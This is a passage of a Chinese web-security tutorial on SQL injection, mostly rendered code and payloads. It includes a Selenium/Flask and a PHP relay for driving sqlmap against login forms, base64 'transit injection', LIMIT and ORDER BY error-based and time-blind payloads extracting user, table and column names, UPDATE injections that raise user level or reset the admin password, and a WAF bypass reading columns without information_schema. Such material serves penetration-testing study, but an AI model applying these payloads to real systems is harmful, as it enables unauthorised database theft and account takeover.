<span class="token keyword">from</span> selenium <span class="token keyword">import</span> webdriver
driver_path <span class="token operator">=</span> <span class="token string">&quot;C:/Users/Administrator/AppData/Local/Programs/Python/Python37/Lib/site-packages/selenium/webdriver/chrome/chromedriver.exe&quot;</span>
chrome <span class="token operator">=</span> webdriver<span class="token punctuation">.</span>Chrome<span class="token punctuation">(</span>driver_path<span class="token punctuation">)</span>
chrome<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;http://127.0.0.1&quot;</span><span class="token punctuation">)</span>   <span class="token comment">#目标注入点</span>
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token comment">#起到中转payload效果</span>
<span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
   chrome<span class="token punctuation">.</span>find_element_by_id<span class="token punctuation">(</span><span class="token string">&quot;username&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token comment">#把payload填到有注入点的地方</span>
   chrome<span class="token punctuation">.</span>find_element_by_id<span class="token punctuation">(</span><span class="token string">&quot;password&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span><span class="token string">&quot;aaaa&quot;</span><span class="token punctuation">)</span>
   chrome<span class="token punctuation">.</span>find_element_by_id<span class="token punctuation">(</span><span class="token string">&quot;submit&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>
   <span class="token keyword">return</span> <span class="token string">&quot;1234&quot;</span> <span class="token comment">#随便返回一下不重要，结果看Flask Server</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">&#39;/&#39;</span><span class="token punctuation">)</span>
<span class="token comment"># 接收sqlmap传递过来的payload</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
   payload <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;payload&quot;</span><span class="token punctuation">)</span>
   <span class="token keyword">return</span> send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&quot;__main__&quot;</span><span class="token punctuation">:</span>
   app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><p>:::detials sqlmap不能忽略证书，跑不了https的网站？</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$url</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;https://x.x.x.x/aaa.php&quot;</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>arg<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$params</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;email=<span class="token interpolation"><span class="token variable">$s</span></span>&amp;password=aa&quot;</span><span class="token punctuation">;</span>

<span class="token comment">//写出到文件分析.</span>
<span class="token variable">$fp</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;result.txt&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;a&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;Params:&#39;</span><span class="token operator">.</span><span class="token variable">$params</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;\\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_SSL_VERIFYPEER</span><span class="token punctuation">,</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// https请求 不验证证书和hosts</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_SSL_VERIFYHOST</span><span class="token punctuation">,</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_USERAGENT</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_TIMEOUT</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_POST</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// post 提交方式</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_POSTFIELDS</span><span class="token punctuation">,</span> <span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
<span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">==</span><span class="token number">2846</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
   <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;1&quot;</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
   <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;2&quot;</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</span></code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>:::</p><h3 id="base64变形注入" tabindex="-1"><a class="header-anchor" href="#base64变形注入" aria-hidden="true">#</a> Base64变形注入</h3><p>针对传递的参数被base64加密后的注入点进行注入</p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//xxx.com/?id=MQ==     只加密参数</span></span>
<span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//xxx.com/?aWQ9MQ==    连参数名一起加密了</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>1）只加密参数，用sqlmap的脚本</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>sqlmap <span class="token parameter variable">-u</span> http://xxx.com/?id<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--tamper</span> base64encode.py <span class="token parameter variable">--dbs</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>2）参数名也加密了，用中转注入</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code>//trans_sqli.php
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$id</span><span class="token operator">=</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;id=&quot;</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;id&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;http://xxx.com/sqli.php?<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$id</span><span class="token punctuation">}</span></span>&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//sqli.php是原网页</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>sqlmap-u <span class="token string">&quot;http://127.0.0.1/trans_sqli.php?id=12&quot;</span> <span class="token parameter variable">-v3</span> <span class="token parameter variable">--dbs</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="limit注入" tabindex="-1"><a class="header-anchor" href="#limit注入" aria-hidden="true">#</a> Limit注入</h3><p>适用于 <code>5.0.0 &lt; mysql &lt;5.6.6</code> 的版本</p><details class="custom-container details"><summary>limit用法</summary><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">limit</span> m<span class="token punctuation">,</span>n  <span class="token comment">--m记录开始的位置,n是要取的数据条数</span>
<span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span>  <span class="token comment">--从第一条开始，取一条数据</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div></details><h4 id="案例" tabindex="-1"><a class="header-anchor" href="#案例" aria-hidden="true">#</a> 案例：</h4><p>确认有注入点前面有 <code>order by</code> 关键字，没法用<code>union</code>联合查询</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">SELECT</span> field <span class="token keyword">FROM</span> <span class="token keyword">table</span> <span class="token keyword">WHERE</span> id <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> id <span class="token keyword">LIMIT</span> （注入点）
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>在limit后面可以跟两个函数<code>PROCEDURE</code> 和<code>INTO</code>，INTO除非有写入权限，否则是无法利用的；</p><details class="custom-container details"><summary>报错注入利用</summary><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">procedure</span> analyse<span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>时间型盲注利用</summary><p>直接使用sleep不行，需要用BENCHMARK代替</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">PROCEDURE</span> analyse<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> extractvalue<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">IF</span><span class="token punctuation">(</span><span class="token function">MID</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">LIKE</span> <span class="token number">5</span><span class="token punctuation">,</span> BENCHMARK<span class="token punctuation">(</span><span class="token number">5000000</span><span class="token punctuation">,</span>SHA1<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></details><h3 id="order-by注入" tabindex="-1"><a class="header-anchor" href="#order-by注入" aria-hidden="true">#</a> order by注入</h3><p>order by 注入是SQL注入中很常见的，被过滤的概率小；</p><p>可被用户控制的数据在order by 子句后边，即order参数可控。</p><h4 id="利用报错" tabindex="-1"><a class="header-anchor" href="#利用报错" aria-hidden="true">#</a> 利用报错</h4><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token comment">--利用regexp</span>
http:<span class="token comment">//192.168.239.2:81/?order=(select+1+regexp+if(1=1,1,0x00)) --正常</span>
http:<span class="token comment">//192.168.239.2:81/?order=(select+1+regexp+if(1=2,1,0x00)) --错误</span>

<span class="token comment">--利用updatexml</span>
http:<span class="token comment">//192.168.239.2:81/?order=updatexml(1,if(1=1,1,user()),1)  --正常</span>
http:<span class="token comment">//192.168.239.2:81/?order=updatexml(1,if(1=2,1,user()),1)  --错误</span>

<span class="token comment">--利用extractvalue</span>
http:<span class="token comment">//192.168.239.2:81/?order=extractvalue(1,if(1=1,1,user())) --正常</span>
http:<span class="token comment">//192.168.239.2:81/?order=extractvalue(1,if(1=2,1,user())) --错误</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="利用时间盲注" tabindex="-1"><a class="header-anchor" href="#利用时间盲注" aria-hidden="true">#</a> 利用时间盲注</h4><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token operator">/</span>?<span class="token keyword">order</span><span class="token operator">=</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">FROM</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span><span class="token punctuation">(</span>SLEEP<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>test<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">--正常响应时间</span>
<span class="token operator">/</span>?<span class="token keyword">order</span><span class="token operator">=</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">FROM</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span><span class="token punctuation">(</span>SLEEP<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>test<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">--sleep 2秒</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="数据猜解" tabindex="-1"><a class="header-anchor" href="#数据猜解" aria-hidden="true">#</a> 数据猜解</h4><p>以猜解user即<code>root@localhost</code>为例子，由于只能一位一位猜解；</p><p>可以利用SUBSTR,SUBSTRING**,**MID,以及left和right可以精准分割出每一位子串；</p><p>然后就是比较操作了可以利用<code>=,like,regexp</code>等。</p><p>通过以下可以得知user()第一位为 r ,ascii码的16进制为0x72</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>http:<span class="token comment">//192.168.239.2:81/?order=(select+1+regexp+if(substring(user(),1,1)=0x72,1,0x00)) --正确</span>
http:<span class="token comment">//192.168.239.2:81/?order=(select+1+regexp+if(substring(user(),1,1)=0x71,1,0x00)) --错误</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>猜解表名</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token operator">/</span>?<span class="token keyword">order</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">+</span><span class="token operator">regexp</span><span class="token operator">+</span><span class="token keyword">if</span><span class="token punctuation">(</span>substring<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">+</span>concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token keyword">from</span><span class="token operator">+</span>information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token operator">+</span><span class="token keyword">where</span><span class="token operator">+</span>table_schema<span class="token operator">%</span><span class="token number">3</span>ddatabase<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">limit</span><span class="token operator">+</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">0x67</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment">--正确</span>
<span class="token operator">/</span>?<span class="token keyword">order</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">+</span><span class="token operator">regexp</span><span class="token operator">+</span><span class="token keyword">if</span><span class="token punctuation">(</span>substring<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">+</span>concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token keyword">from</span><span class="token operator">+</span>information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token operator">+</span><span class="token keyword">where</span><span class="token operator">+</span>table_schema<span class="token operator">%</span><span class="token number">3</span>ddatabase<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">limit</span><span class="token operator">+</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">0x66</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">--错误</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>猜解列名</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token operator">/</span>?<span class="token keyword">order</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">+</span><span class="token operator">regexp</span><span class="token operator">+</span><span class="token keyword">if</span><span class="token punctuation">(</span>substring<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">+</span>concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token keyword">from</span><span class="token operator">+</span>information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token operator">+</span><span class="token keyword">where</span><span class="token operator">+</span>table_schema<span class="token operator">%</span><span class="token number">3</span>ddatabase<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token operator">and</span><span class="token operator">+</span>table_name<span class="token operator">%</span><span class="token number">3</span>d0x676f6f6473<span class="token operator">+</span><span class="token keyword">limit</span><span class="token operator">+</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">0x69</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">--正常</span>
<span class="token operator">/</span>?<span class="token keyword">order</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">+</span><span class="token operator">regexp</span><span class="token operator">+</span><span class="token keyword">if</span><span class="token punctuation">(</span>substring<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">+</span>concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token keyword">from</span><span class="token operator">+</span>information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token operator">+</span><span class="token keyword">where</span><span class="token operator">+</span>table_schema<span class="token operator">%</span><span class="token number">3</span>ddatabase<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token operator">and</span><span class="token operator">+</span>table_name<span class="token operator">%</span><span class="token number">3</span>d0x676f6f6473<span class="token operator">+</span><span class="token keyword">limit</span><span class="token operator">+</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">--错误</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="update注入" tabindex="-1"><a class="header-anchor" href="#update注入" aria-hidden="true">#</a> Update注入</h3><p>这种方式会修改数据很危险，在授权测试允许的情况下才考虑，一般在用户修改密码的地方。</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">UPDATE</span> <span class="token keyword">user</span> <span class="token keyword">SET</span> password<span class="token operator">=</span><span class="token string">&#39;MD5($password)&#39;</span><span class="token punctuation">,</span> homepage<span class="token operator">=</span><span class="token string">&#39;$homepage&#39;</span> <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token string">&#39;$id&#39;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>如果此 <strong>SQL</strong> 被修改成以下形式，就实现了注入</p><p>1、修改 homepage 值为<code>http://baidu.com&#39;</code>, userlevel=&#39;3</p><p>之后 SQL 语句变为</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">UPDATE</span> <span class="token keyword">user</span> <span class="token keyword">SET</span> password<span class="token operator">=</span><span class="token string">&#39;mypass&#39;</span><span class="token punctuation">,</span> homepage<span class="token operator">=</span><span class="token string">&#39;http://baidu.com&#39;</span><span class="token punctuation">,</span> userlevel<span class="token operator">=</span><span class="token string">&#39;3&#39;</span> <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token string">&#39;$id&#39;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>userlevel为用户级别</p><p>2、修改 password 值为mypass)&#39; WHERE username=&#39;admin&#39;#</p><p>之后 SQL 语句变为</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">UPDATE</span> <span class="token keyword">user</span> <span class="token keyword">SET</span> password<span class="token operator">=</span><span class="token string">&#39;MD5(mypass)&#39;</span> <span class="token keyword">WHERE</span> username<span class="token operator">=</span><span class="token string">&#39;admin&#39;</span><span class="token comment">#)&#39;, homepage=&#39;$homepage&#39; WHERE id=&#39;$id&#39;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>3、修改 id 值为&#39; OR username=&#39;admin&#39;之后 SQL语句变为</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">UPDATE</span> <span class="token keyword">user</span> <span class="token keyword">SET</span> password<span class="token operator">=</span><span class="token string">&#39;MD5($password)&#39;</span><span class="token punctuation">,</span> homepage<span class="token operator">=</span><span class="token string">&#39;$homepage&#39;</span> <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token string">&#39;&#39;</span> <span class="token operator">OR</span> username<span class="token operator">=</span><span class="token string">&#39;admin&#39;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="绕过技巧" tabindex="-1"><a class="header-anchor" href="#绕过技巧" aria-hidden="true">#</a> 绕过技巧</h2><h3 id="未知列名下的注入" tabindex="-1"><a class="header-anchor" href="#未知列名下的注入" aria-hidden="true">#</a> 未知列名下的注入</h3><p>mysql &lt;5.0 或遇到了WAF-安全狗3.5版本会直接拦截关键字<code>information_shema</code>；</p><p>从而无法获取数据表的列名，这时可以<code>利用虚表获取数据</code>。</p><p>直接<code>select 1,2,3</code>时，会创建一个虚拟的表</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token identifier"><span class="token punctuation">\`</span>3<span class="token punctuation">\`</span></span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span>a <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">--可以通过不停的修改列名1，2，3来提取数据( 改这个用反引号包裹的\`3\`)</span>
